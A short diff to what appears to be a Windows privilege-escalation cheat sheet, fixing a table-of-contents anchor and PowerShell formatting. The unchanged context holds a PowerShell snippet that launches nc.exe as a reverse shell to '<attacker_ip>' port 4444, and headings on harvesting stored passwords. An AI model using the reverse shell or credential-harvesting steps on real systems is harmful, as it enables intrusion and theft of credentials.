@@ -12,7 +12,7 @@
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
     * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
-    * [Passwords in unattend.xml](#passwords-in-unattend.xml)
+    * [Passwords in unattend.xml](#passwords-in-unattendxml)
     * [Wifi passwords](#wifi-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
     * [Powershell history](#powershell-history)
@@ -712,9 +712,9 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 ```powershell
-$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
-$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-$ computer = "<hostname>"
+$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
 
